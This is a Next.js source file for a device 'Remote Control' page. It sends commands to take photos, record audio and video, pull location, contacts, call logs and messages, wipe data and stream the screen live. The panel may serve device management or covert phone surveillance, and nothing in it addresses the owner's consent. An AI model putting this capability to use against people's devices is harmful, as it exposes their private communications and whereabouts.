'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import AuthWrapper from '@/components/auth/AuthWrapper';
import Layout from '@/components/layout/Layout';
import { Device } from '@/types/device';
import { CommandType, SendCommandData } from '@/types/command';
import { deviceApi } from '@/lib/deviceApi';
import { commandApi } from '@/lib/commandApi';
import { useAppDispatch } from '@/lib/hooks';
import { addToast } from '@/store/slices/appSlice';
import { 
  Monitor,
  Square,
  Camera,
  Mic,
  Video,
  Map,
  Users,
  Phone,
  MessageSquare,
  Trash2,
  RefreshCw,
  ChevronDown,
  Clock,
  Download
} from 'lucide-react';
import ScreenShareModal from '@/components/devices/ScreenShareModal';
import { log } from 'console';

export default function RemoteControlPage() {
  const dispatch = useAppDispatch();
  const wsUrl = process.env.NEXT_PUBLIC_WEBSOCKET_URL || 'ws://localhost:9090/signaling';
  //const remoteVideoRef = useRef<HTMLVideoElement>(null);
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isSendingCommand, setIsSendingCommand] = useState(false);
  const [isScreenShareModalOpen, setIsScreenShareModalOpen] = useState(false);
  const [screenShareStatus, setScreenShareStatus] = useState('disconnected');
  const [peerConnection, setPeerConnection] = useState<RTCPeerConnection | null>(null);
  const [wsConnection, setWsConnection] = useState<WebSocket | null>(new WebSocket(wsUrl));
  const [isConnected, setIsConnected] = useState(false);
  const [previousRecordings, setPreviousRecordings] = useState<Array<{
    id: string;
    deviceId: string;
    deviceName: string;
    type: string;
    timestamp: string;
    duration: string;
    size: string;
  }>>([]);

  // Load devices
  const loadDevices = useCallback(async () => {
    try {
      const result = await deviceApi.getDevices();
      if (result.success) {
        setDevices(result.data.data || []);
      } else {
        dispatch(addToast({
          type: 'error',
          title: 'Failed to load devices',
          message: result.error?.message || 'Failed to load devices',
        }));
      }
    } catch {
      dispatch(addToast({
        type: 'error',
        title: 'Failed to load devices',
        message: 'An unexpected error occurred',
      }));
    } finally {
      setIsLoading(false);
    }
  }, [dispatch]);

  // Load previous recordings (mock data for now)
  const loadPreviousRecordings = useCallback(async () => {
    // TODO: Implement API call to get previous recordings
    if (!selectedDevice) return;
    
    setPreviousRecordings([
      {
        id: '1',
        deviceId: selectedDevice.id,
        deviceName: selectedDevice.name,
        type: 'screen_recording',
        duration: '2:34',
        timestamp: new Date().toISOString(),
        size: '15.2 MB'
      },
      {
        id: '2',
        deviceId: selectedDevice.id,
        deviceName: selectedDevice.name,
        type: 'audio_recording',
        duration: '1:45',
        timestamp: new Date(Date.now() - 86400000).toISOString(),
        size: '8.7 MB'
      }
    ]);
  }, [selectedDevice]);

  // WebSocket connection functions
  const connectWebSocket = (isScreenShare: boolean=false) => {

   
    if ( !selectedDevice) { //wsConnection ||
      return;
    }
    const ws = wsConnection || new WebSocket(wsUrl);
    console.log('Attempting to connect to WebSocket:', wsUrl);
    
    if(wsConnection)
      setWsConnection(ws);

    ws.onopen = () => {
      console.log('WebSocket connected for remote control');
      setIsConnected(true);
      setScreenShareStatus('connected - waiting for offer');

      setWsConnection(ws);

      if(isScreenShare){
          setTimeout(() => {  
            const payload = {
              type: "client-message",
              action: "record_screen",
              duration:3000,
              timestamp: Date.now()
            };
            ws.send(JSON.stringify(payload));
            console.log('Screen record command sent:', payload);
          }, 2000);
            
      }

    };

    ws.onmessage = async (event) => {
      try {
        let message = null;

        if (event.data instanceof Blob) {
          const text = await event.data.text();
          message = JSON.parse(text);
        } 
        else {
          message = JSON.parse(event.data);
        }

        console.log('WebSocket message received:', message);

        if (!peerConnection) {
          setupPeerConnection();
        }
    
        const pc = peerConnection || setupPeerConnection();

         // Handle ICE candidate without type
         if (message && message.candidate && !message.type) {
          try {
            const candidate = new RTCIceCandidate(message);
            await pc.addIceCandidate(candidate);
            setScreenShareStatus('Connected');
            console.log('Remote candidate added');
            console.log("Added ICE candidate (no type).");
          } catch (err) {
            console.error("Error adding ICE candidate", err);
          }
          return;
        }
        
        // Handle different message types
        switch (message.type) {
          case 'offer':
            //handleWebRTCOffer(message);
              await pc.setRemoteDescription(new RTCSessionDescription(message));
              const answer = await pc.createAnswer();
              
              const answerPayload = {
                type: answer.type,
                sdp: answer.sdp
              };
        
              console.log('Answer created:', answerPayload);
              await pc.setLocalDescription(answer);
              ws.send(JSON.stringify(answerPayload));
              setScreenShareStatus('Waiting for stream...');
            break;
          case 'candidate':
            //handleIceCandidate(message);
            try{
              const candidate = new RTCIceCandidate(message);
              await pc.addIceCandidate(candidate);
              setScreenShareStatus('Connected');
              console.log('Remote candidate added');
              console.log("Added ICE candidate (no type).");
            } catch (err) {
              console.error("Error adding ICE candidate", err);
            }
            break;
          case 'command-response':
            // Handle command responses
            dispatch(addToast({
              type: 'success',
              title: 'Command Response',
              message: `Command executed: ${message.data?.result || 'Success'}`,
            }));
            break;
        }
      } 
      catch (error) {
        console.error('Failed to parse WebSocket message:', error);
      }
    };

    ws.onclose = (event) => {
      console.log('WebSocket closed:', event.code, event.reason);
      setIsConnected(false);
      setScreenShareStatus('disconnected');
      setWsConnection(null);
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
      console.error('WebSocket readyState:', ws.readyState);
      console.error('WebSocket URL:', ws.url);
      setIsConnected(false);
      setScreenShareStatus('error');
    };
  };

  const disconnectWebSocket = () => {
    if (wsConnection) {
      wsConnection.close(1000, 'Manual disconnect');
      setWsConnection(null);
    }
    setIsConnected(false);
    setScreenShareStatus('disconnected');
  };

  const sendMessage = (message: Record<string, unknown>) => {
    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify(message));
      return true;
    }
    return false;
  };

  // WebRTC handling functions
  const setupPeerConnection = () => {
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
    });

    
    pc.ontrack = (event) => {
      const remoteVideo = document.getElementById('remoteVideo') as HTMLVideoElement;

      console.log('Remote track received');
      setScreenShareStatus('Live');
      console.log('EVENT:', event);
       if (remoteVideo) {
            remoteVideo.srcObject = event.streams[0];
        }else{
          console.error('Remote video element not found for track received');
        }
    };


    pc.onicecandidate = (event) => {

      console.log('ICE candidate received:', event.candidate);
      console.log('ICE candidate type:', event.candidate?.type);

      if (!event.candidate) return;

      console.log('Sending ICE ws connection:', wsConnection);
      
        wsConnection?.send(JSON.stringify({
        type: 'candidate',
        sdpMLineIndex: event.candidate.sdpMLineIndex,
        sdpMid: event.candidate.sdpMid,
        candidate: event.candidate.candidate
      }));

    };

    pc.onconnectionstatechange = () => {
      console.log('Peer connection state:', pc.connectionState);
      console.log("pc state " + pc.connectionState);
       const remoteVideo = document.getElementById('remoteVideo') as HTMLVideoElement;
    
      if (pc.connectionState == "connected") {
          remoteVideo.muted = true; // mute the video
          remoteVideo.play().catch(err => console.error('Video play error:', err));
      }
      setScreenShareStatus(pc.connectionState);
    };

    setPeerConnection(pc);
    return pc;
  };

  const handleWebRTCOffer = async (message: RTCSessionDescriptionInit) => {
    console.log('Offer received:', message);
    setScreenShareStatus('offer received');
    
    if (!peerConnection) {
      setupPeerConnection();
    }

    const pc = peerConnection || setupPeerConnection();
    
    try {
      await pc.setRemoteDescription(new RTCSessionDescription(message));
      const answer = await pc.createAnswer();
      
      const answerPayload = {
        type: answer.type,
        sdp: answer.sdp
      };

      console.log('Answer created:', answerPayload);
      await pc.setLocalDescription(answer);
      wsConnection?.send(JSON.stringify(answerPayload));
      setScreenShareStatus('Waiting for stream...');
    } catch (error) {
      console.error('Error handling offer:', error);
      setScreenShareStatus('error');
    }
  };

  const handleIceCandidate = async (message: RTCIceCandidateInit) => {
    if (!peerConnection) return;
    
    try {
      const candidate = new RTCIceCandidate({
        sdpMLineIndex: message.sdpMLineIndex,
        sdpMid: message.sdpMid,
        candidate: message.candidate
        });

      await peerConnection.addIceCandidate(candidate);
      setScreenShareStatus('Connected');
      console.log('Remote candidate added');
    } catch (error) {
      console.error('Error adding ICE candidate:', error);
    }
  };

  // Send command to device
  const sendCommand = async (command: CommandType, payload?: Record<string, unknown>) => {
    if (!selectedDevice) {
      dispatch(addToast({
        type: 'error',
        title: 'No Device Selected',
        message: 'Please select a device first',
      }));
      return;
    }

    setIsSendingCommand(true);
    try {
      const commandData: SendCommandData =  {
        action: command,
        type: 'client-message',
        deviceId: selectedDevice.id,
        duration: payload?.duration as number,
        timestamp: payload?.timestamp as number,
      };
      const result = await commandApi.sendCommand(selectedDevice.id, commandData);

      if (result.success) {
        dispatch(addToast({
          type: 'success',
          title: 'Command Sent',
          message: `${command.replace('_', ' ')} command sent successfully`,
        }));
      } else {
        dispatch(addToast({
          type: 'error',
          title: 'Failed to send command',
          message: result.error?.message || 'Command failed',
        }));
      }
    } catch {
      dispatch(addToast({
        type: 'error',
        title: 'Failed to send command',
        message: 'An unexpected error occurred',
      }));
    } finally {
      setIsSendingCommand(false);
    }
  };

  // Handle screen share
  const handleScreenShare = async () => {
    if (!selectedDevice) {
      dispatch(addToast({
        type: 'error',
        title: 'No Device Selected',
        message: 'Please select a device first',
      }));
      return;
    }

    try {
      if (isScreenShareModalOpen) {
        // Close modal and cleanup
        setIsScreenShareModalOpen(false);
        if (peerConnection) {
          peerConnection.close();
          setPeerConnection(null);
        }
        disconnectWebSocket();
        setScreenShareStatus('disconnected');
      } else {
        // Open modal, connect WebSocket, and setup peer connection
        setIsScreenShareModalOpen(true);
        connectWebSocket(true);
        setupPeerConnection();
        setScreenShareStatus('Connecting...');
        
        // Send screen record command to WebSocke
        
      }
    } catch (err) {
      dispatch(addToast({
        type: 'error',
        title: 'Screen Share Error',
        message: err instanceof Error ? err.message : 'Failed to start screen share',
      }));
    }
  };


  useEffect(() => {
    loadDevices();
  }, [loadDevices]);

  useEffect(() => {
    if (selectedDevice) {
      loadPreviousRecordings();
    }
  }, [selectedDevice, loadPreviousRecordings]);

  // Cleanup WebSocket connection on unmount
  useEffect(() => {
    return () => {
      if (wsConnection) {
        wsConnection.close();
      }
    };
  }, [wsConnection]);

  const commandButtons = [
    { command: 'TAKE_PHOTO' as CommandType, deviceId: selectedDevice?.deviceId,action: 'take_photo',type: 'client-message', icon: Camera, label: 'Take Photo', iconColor: 'text-blue-500' },
    { command: 'RECORD_AUDIO' as CommandType, deviceId: selectedDevice?.deviceId, action: 'record_audio', type: 'client-message', icon: Mic, label: 'Record Audio', iconColor: 'text-green-500' },
    { command: 'RECORD_VIDEO' as CommandType, deviceId: selectedDevice?.deviceId, action: 'record_video', type: 'client-message', icon: Video, label: 'Record Video', iconColor: 'text-purple-500' },
    { command: 'GET_LOCATION' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_location', type: 'client-message', icon: Map, label: 'Get Location', iconColor: 'text-orange-500' },
    { command: 'GET_CONTACTS' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_contacts', type: 'client-message', icon: Users, label: 'Get Contacts', iconColor: 'text-indigo-500' },
    { command: 'GET_CALL_LOGS' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_call_logs', type: 'client-message', icon: Phone, label: 'Get Call Logs', iconColor: 'text-pink-500' },
    { command: 'GET_MESSAGES' as CommandType, deviceId: selectedDevice?.deviceId, action: 'get_messages', type: 'client-message', icon: MessageSquare, label: 'Get Messages', iconColor: 'text-teal-500' },
    { command: 'RESTART_DEVICE' as CommandType,deviceId: selectedDevice?.deviceId, action: 'restart_device', type: 'client-message', icon: RefreshCw, label: 'Restart Device', iconColor: 'text-yellow-500' },
    { command: 'WIPE_DATA' as CommandType,deviceId: selectedDevice?.deviceId, action: 'wipe_data', type: 'client-message', icon: Trash2, label: 'Wipe Data', iconColor: 'text-red-500' },
  ];

  if (isLoading) {
    return (
      <AuthWrapper>
        <Layout>
          <div className="flex items-center justify-center h-64">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
          </div>
        </Layout>
      </AuthWrapper>
    );
  }

  return (
    <AuthWrapper>
      <Layout>
        <div className="space-y-6">
          {/* Header */}
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold text-gray-900">Remote Control</h1>
              <p className="text-gray-600">Control and monitor your devices remotely</p>
            </div>
            <div className="flex items-center gap-2">
              <div className={`w-3 h-3 rounded-full ${isScreenShareModalOpen ? 'bg-green-500' : 'bg-gray-400'}`}></div>
              <span className="text-sm text-gray-600">
                {isScreenShareModalOpen ? 'Screen Share Active' : 'Ready'}
              </span>
            </div>
          </div>

          {/* Device Selection */}
          <div className="bg-white rounded-lg border border-gray-200 p-6">
            <h2 className="text-lg font-semibold text-gray-900 mb-4">Select Device</h2>
            <div className="relative">
              <select
                value={selectedDevice?.id || ''}
                onChange={(e) => {
                  const device = devices.find(d => d.id === e.target.value);
                  setSelectedDevice(device || null);
                }}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent appearance-none bg-white"
              >
                <option value="">Choose a device...</option>
                {devices.map((device) => (
                  <option key={device.id} value={device.id}>
                    {device.name} ({device.deviceId}) - {device.isOnline ? 'Online' : 'Offline'}
                  </option>
                ))}
              </select>
              <ChevronDown className="absolute right-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400 pointer-events-none" />
            </div>
            
            {selectedDevice && (
              <div className="mt-4 p-4 bg-gray-50 rounded-lg">
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="font-medium text-gray-900">{selectedDevice.name}</h3>
                    <p className="text-sm text-gray-600">
                      {selectedDevice.model} • {selectedDevice.isOnline ? 'Online' : 'Offline'} • Battery: {selectedDevice.batteryLevel || 0}%
                    </p>
                  </div>
                  <div className={`px-3 py-1 rounded-full text-xs font-medium ${
                    selectedDevice.isOnline ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
                  }`}>
                    {selectedDevice.isOnline ? 'Online' : 'Offline'}
                  </div>
                </div>
              </div>
            )}
          </div>

          {selectedDevice && (
            <>
              {/* Screen Share Section */}
              <div className="bg-white rounded-lg border border-gray-200">
                <div className="px-6 py-4 border-b border-gray-200">
                  <h2 className="text-lg font-semibold text-gray-900">Live Screen View</h2>
                  <p className="text-sm text-gray-600">View device screen in real-time</p>
                </div>
                <div className="p-6">
                  <button
                    onClick={handleScreenShare}
                    className={`flex items-center gap-2 px-6 py-3 rounded-lg text-white font-medium transition-colors ${
                      isScreenShareModalOpen 
                        ? 'bg-red-500 hover:bg-red-600' 
                        : 'bg-indigo-500 hover:bg-indigo-600'
                    }`}
                  >
                    {isScreenShareModalOpen ? (
                      <>
                        <Square className="h-5 w-5" />
                        Stop Screen Share
                      </>
                    ) : (
                      <>
                        <Monitor className="h-5 w-5" />
                        Start Screen Share
                      </>
                    )}
                  </button>
                  <p className="text-sm text-gray-600 mt-2">
                    Status: {screenShareStatus}
                  </p>
                </div>
              </div>

              {/* Remote Commands */}
              <div className="bg-white rounded-lg border border-gray-200">
                <div className="px-6 py-4 border-b border-gray-200">
                  <h2 className="text-lg font-semibold text-gray-900">Remote Commands</h2>
                  <p className="text-sm text-gray-600">Send commands to the selected device</p>
                </div>
                <div className="p-6">
                  <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-8 gap-4">
                    {commandButtons.map(({ command, icon: Icon, label, iconColor }) => (
                      <button
                        key={command}
                        onClick={() => sendCommand(command)}
                        disabled={isSendingCommand}
                        className={`flex flex-col items-center gap-3 p-4 rounded-lg bg-white border border-gray-200 hover:border-gray-300 hover:shadow-md transition-all ${
                          isSendingCommand ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'
                        }`}
                      >
                        <Icon className={`h-6 w-6 ${iconColor}`} />
                        <span className="text-sm font-medium text-gray-700">{label}</span>
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              {/* Previous Recordings */}
              <div className="bg-white rounded-lg border border-gray-200">
                <div className="px-6 py-4 border-b border-gray-200">
                  <h2 className="text-lg font-semibold text-gray-900">Previous Recordings</h2>
                  <p className="text-sm text-gray-600">View and download previous recordings</p>
                </div>
                <div className="p-6">
                  {previousRecordings.length === 0 ? (
                    <div className="text-center py-8">
                      <Clock className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                      <p className="text-gray-600">No recordings available</p>
                    </div>
                  ) : (
                    <div className="space-y-3">
                      {previousRecordings.map((recording) => (
                        <div key={recording.id} className="flex items-center justify-between p-4 border border-gray-200 rounded-lg">
                          <div className="flex items-center gap-3">
                            <div className="p-2 bg-gray-100 rounded-lg">
                              {recording.type === 'screen_recording' ? (
                                <Monitor className="h-5 w-5 text-gray-600" />
                              ) : (
                                <Mic className="h-5 w-5 text-gray-600" />
                              )}
                            </div>
                            <div>
                              <h4 className="font-medium text-gray-900">
                                {recording.type === 'screen_recording' ? 'Screen Recording' : 'Audio Recording'}
                              </h4>
                              <p className="text-sm text-gray-600">
                                {new Date(recording.timestamp).toLocaleString()} • {recording.duration} • {recording.size}
                              </p>
                            </div>
                          </div>
                          <button className="p-2 text-gray-400 hover:text-gray-600 transition-colors">
                            <Download className="h-5 w-5" />
                          </button>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            </>
          )}

          {/* Screen Share Modal */}
          <ScreenShareModal
            isOpen={isScreenShareModalOpen}
            onClose={handleScreenShare}
            deviceName={selectedDevice?.name}
            deviceId={selectedDevice?.id || ''}
            screenShareStatus={screenShareStatus}
            isConnected={isConnected}
          />
        </div>
      </Layout>
    </AuthWrapper>
  );
}